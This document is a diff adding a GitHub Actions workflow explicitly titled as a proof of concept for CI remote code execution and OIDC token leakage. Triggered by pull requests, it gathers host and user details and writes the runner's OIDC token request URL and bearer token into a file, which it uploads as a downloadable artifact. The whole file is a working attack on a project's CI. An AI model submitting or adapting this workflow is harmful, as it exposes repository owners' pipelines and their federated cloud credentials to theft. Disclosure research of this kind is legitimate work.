@@ -1,0 +1,45 @@
+name: PoC: CI RCE & OIDC Token Leak
+
+on:
+  pull_request:
+    branches:
+      - master
+    types: [opened, synchronize]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exploit:
+    name: CI RCE PoC with OIDC Leak
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Setup Environment
+        run: |
+          echo "SAFE_CI_PROOF [+] Executing payload..." > leaks.txt
+          echo "== WHOAMI ==" >> leaks.txt
+          whoami >> leaks.txt
+
+          echo "== ID ==" >> leaks.txt
+          id >> leaks.txt
+
+          echo "== UNAME ==" >> leaks.txt
+          uname -a >> leaks.txt
+
+          echo "== OS RELEASE ==" >> leaks.txt
+          cat /etc/os-release >> leaks.txt
+
+          echo "== ENVIRONMENT (SANITIZED) ==" >> leaks.txt
+          env | grep -E '^(HOME|LANG|USER|PATH)' >> leaks.txt
+
+          echo "== OIDC_TOKEN ATTEMPT ==" >> leaks.txt
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL" >> leaks.txt
+          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> leaks.txt
+
+      - name: Upload Leak Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: leaks.txt
+          path: leaks.txt
